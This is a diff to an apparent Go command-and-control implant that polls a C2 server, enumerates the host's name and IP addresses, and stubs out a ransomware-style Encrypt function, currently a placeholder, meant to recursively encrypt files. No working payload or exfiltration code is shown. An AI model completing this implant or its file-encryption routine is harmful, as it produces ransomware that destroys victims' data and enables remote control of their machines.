@@ -23,6 +23,8 @@ type Enumeration struct {
 	IP       []string `json:"IP"`
 }
 
+var Discovery Enumeration
+
 //Iniates first connection to the host
 func main() {
 	//test webserver is up and running
@@ -30,7 +32,7 @@ func main() {
 	if err != nil {
 		panic(err)
 	}
-	fmt.Println("I made a request to the C2")
+
 	if resp.StatusCode == 404 {
 		//wait for web server to be running
 		for x := 1; x < 100; x++ { //TODO: change to while loop
@@ -138,7 +140,6 @@ func KeepAlive(userString string) error {
 //Enumerates host machine, listens for command from C2
 func Enumerate() Enumeration {
 	//https://hack.technoherder.com/linux-host-enumeration/
-	var Discovery Enumeration
 
 	//Get hostname
 	Hostname, err := os.Hostname()
@@ -176,8 +177,9 @@ func Enumerate() Enumeration {
 	return Discovery
 }
 
-//Encrypts files, listens for command from C2
+//recursively find files and encrypt with goroutine
 func Encrypt() {
-	//recursively find files and encrypt with goroutine
+	//placeholder code
 	fmt.Println("I would start encrypting")
+	os.Exit(1)
 }
